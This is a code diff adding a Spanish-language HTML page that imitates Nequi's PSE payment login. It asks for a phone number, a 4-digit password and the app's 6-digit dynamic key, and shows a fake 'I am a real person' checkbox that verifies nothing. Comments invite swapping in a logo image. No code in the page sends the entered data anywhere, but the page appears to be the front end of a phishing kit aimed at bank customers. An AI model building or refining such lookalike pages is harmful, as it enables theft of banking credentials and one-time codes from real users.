@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagos PSE de Nequi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Logo - cambia el src por tu imagen */
+        .logo {
+            width: 150px;
+            height: 50px;
+            margin-bottom: 30px;
+            object-fit: contain;
+        }
+
+        .logo-placeholder {
+            width: 150px;
+            height: 50px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-placeholder .dot {
+            width: 12px;
+            height: 12px;
+            background-color: #DA0081;
+            border-radius: 50%;
+            margin-right: 4px;
+        }
+
+        .logo-placeholder .text {
+            font-size: 42px;
+            font-weight: 700;
+            color: #320046;
+            letter-spacing: -1px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #320046;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .description {
+            font-size: 16px;
+            color: #666;
+            text-align: center;
+            line-height: 1.5;
+            margin-bottom: 40px;
+            max-width: 350px;
+        }
+
+        /* Vista Login */
+        .login-view {
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 18px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 12px;
+            background-color: #f5f5f5;
+            margin-bottom: 12px;
+            outline: none;
+            color: #320046;
+        }
+
+        .input-field::placeholder {
+            color: #888;
+        }
+
+        .input-field:focus {
+            background-color: #f0f0f0;
+        }
+
+        /* Checkbox Captcha con animacion de palpito */
+        .captcha-box {
+            width: 100%;
+            padding: 20px;
+            border: 2px solid #f8c8dc;
+            border-radius: 12px;
+            background-color: #fef5f8;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .captcha-box:hover {
+            border-color: #DA0081;
+            background-color: #fff0f5;
+        }
+
+        .captcha-checkbox {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #DA0081;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: all 0.3s ease;
+        }
+
+        .captcha-box:hover .captcha-checkbox {
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(218, 0, 129, 0.4);
+            }
+            50% {
+                transform: scale(1.05);
+                box-shadow: 0 0 0 10px rgba(218, 0, 129, 0);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(218, 0, 129, 0);
+            }
+        }
+
+        .captcha-checkbox.checked {
+            background-color: #DA0081;
+        }
+
+        .captcha-checkbox.checked::after {
+            content: '✓';
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .captcha-text {
+            font-size: 16px;
+            color: #320046;
+            font-weight: 500;
+            line-height: 1.4;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            background-color: #f8c8dc;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-bottom: 12px;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-primary:hover {
+            background-color: #DA0081;
+        }
+
+        .btn-primary.active {
+            background-color: #DA0081;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #320046;
+            background-color: white;
+            border: 2px solid #e0e0e0;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-secondary:hover {
+            border-color: #320046;
+        }
+
+        .footer-text {
+            font-size: 14px;
+            color: #888;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        /* Vista PIN */
+        .pin-view {
+            width: 100%;
+            display: none;
+        }
+
+        .pin-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 50px;
+        }
+
+        .pin-digit {
+            width: 40px;
+            height: 50px;
+            border: none;
+            border-bottom: 3px solid #320046;
+            background: transparent;
+            font-size: 24px;
+            text-align: center;
+            color: #320046;
+            outline: none;
+        }
+
+        .pin-digit:focus {
+            border-bottom-color: #DA0081;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            max-width: 300px;
+            margin: 0 auto 30px;
+        }
+
+        .key {
+            width: 80px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            font-weight: 500;
+            color: #320046;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            border-radius: 10px;
+            transition: background-color 0.2s ease;
+        }
+
+        .key:hover {
+            background-color: #f5f5f5;
+        }
+
+        .key:active {
+            background-color: #e0e0e0;
+        }
+
+        .key.delete {
+            background-color: #320046;
+            color: white;
+            border-radius: 8px;
+            width: 50px;
+            height: 40px;
+            font-size: 18px;
+        }
+
+        .key.delete:hover {
+            background-color: #4a0066;
+        }
+
+        .key.empty {
+            visibility: hidden;
+        }
+
+        /* Navegacion entre vistas */
+        .view-toggle {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 10px;
+        }
+
+        .view-btn {
+            padding: 10px 20px;
+            font-size: 14px;
+            border: 2px solid #320046;
+            background: white;
+            color: #320046;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .view-btn.active {
+            background: #320046;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo - Reemplaza con tu imagen -->
+        <!-- <img src="tu-logo.png" alt="Nequi" class="logo"> -->
+        <div class="logo-placeholder">
+            <span class="dot"></span>
+            <span class="text">Nequi</span>
+        </div>
+
+        <h1>Pagos PSE de Nequi</h1>
+
+        <!-- Vista Login -->
+        <div class="login-view" id="loginView">
+            <p class="description">
+                Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
+            </p>
+
+            <input type="tel" class="input-field" placeholder="Número de celular" maxlength="10">
+            <input type="password" class="input-field" placeholder="Clave" maxlength="4">
+
+            <div class="captcha-box" id="captchaBox">
+                <div class="captcha-checkbox" id="captchaCheck"></div>
+                <span class="captcha-text">Confirmo que soy una persona real.</span>
+            </div>
+
+            <button class="btn-primary" id="btnEntra">Entra</button>
+            <button class="btn-secondary">Ahora No</button>
+
+            <p class="footer-text">
+                ¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.
+            </p>
+        </div>
+
+        <!-- Vista PIN -->
+        <div class="pin-view" id="pinView">
+            <p class="description">
+                Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi.
+            </p>
+
+            <div class="pin-inputs">
+                <input type="text" class="pin-digit" maxlength="1" data-index="0">
+                <input type="text" class="pin-digit" maxlength="1" data-index="1">
+                <input type="text" class="pin-digit" maxlength="1" data-index="2">
+                <input type="text" class="pin-digit" maxlength="1" data-index="3">
+                <input type="text" class="pin-digit" maxlength="1" data-index="4">
+                <input type="text" class="pin-digit" maxlength="1" data-index="5">
+            </div>
+
+            <div class="keypad">
+                <button class="key" data-value="1">1</button>
+                <button class="key" data-value="2">2</button>
+                <button class="key" data-value="3">3</button>
+                <button class="key" data-value="4">4</button>
+                <button class="key" data-value="5">5</button>
+                <button class="key" data-value="6">6</button>
+                <button class="key" data-value="7">7</button>
+                <button class="key" data-value="8">8</button>
+                <button class="key" data-value="9">9</button>
+                <button class="key empty"></button>
+                <button class="key" data-value="0">0</button>
+                <button class="key delete" id="deleteKey">✕</button>
+            </div>
+
+            <button class="btn-secondary">Cancela</button>
+        </div>
+    </div>
+
+    <!-- Botones para cambiar entre vistas -->
+    <div class="view-toggle">
+        <button class="view-btn active" onclick="showView('login')">Login</button>
+        <button class="view-btn" onclick="showView('pin')">PIN</button>
+    </div>
+
+    <script>
+        // Toggle captcha
+        const captchaBox = document.getElementById('captchaBox');
+        const captchaCheck = document.getElementById('captchaCheck');
+        const btnEntra = document.getElementById('btnEntra');
+
+        captchaBox.addEventListener('click', function() {
+            captchaCheck.classList.toggle('checked');
+            if (captchaCheck.classList.contains('checked')) {
+                btnEntra.classList.add('active');
+            } else {
+                btnEntra.classList.remove('active');
+            }
+        });
+
+        // Keypad functionality
+        const pinDigits = document.querySelectorAll('.pin-digit');
+        const keys = document.querySelectorAll('.key[data-value]');
+        const deleteKey = document.getElementById('deleteKey');
+        let currentIndex = 0;
+
+        keys.forEach(key => {
+            key.addEventListener('click', function() {
+                if (currentIndex < 6) {
+                    pinDigits[currentIndex].value = this.dataset.value;
+                    currentIndex++;
+                    if (currentIndex < 6) {
+                        pinDigits[currentIndex].focus();
+                    }
+                }
+            });
+        });
+
+        deleteKey.addEventListener('click', function() {
+            if (currentIndex > 0) {
+                currentIndex--;
+                pinDigits[currentIndex].value = '';
+                pinDigits[currentIndex].focus();
+            }
+        });
+
+        // Pin input direct typing
+        pinDigits.forEach((digit, index) => {
+            digit.addEventListener('input', function() {
+                if (this.value && index < 5) {
+                    pinDigits[index + 1].focus();
+                    currentIndex = index + 1;
+                }
+            });
+            digit.addEventListener('focus', function() {
+                currentIndex = index;
+            });
+        });
+
+        // View toggle
+        function showView(view) {
+            const loginView = document.getElementById('loginView');
+            const pinView = document.getElementById('pinView');
+            const viewBtns = document.querySelectorAll('.view-btn');
+
+            viewBtns.forEach(btn => btn.classList.remove('active'));
+
+            if (view === 'login') {
+                loginView.style.display = 'block';
+                pinView.style.display = 'none';
+                viewBtns[0].classList.add('active');
+            } else {
+                loginView.style.display = 'none';
+                pinView.style.display = 'block';
+                viewBtns[1].classList.add('active');
+            }
+        }
+    </script>
+</body>
+</html>
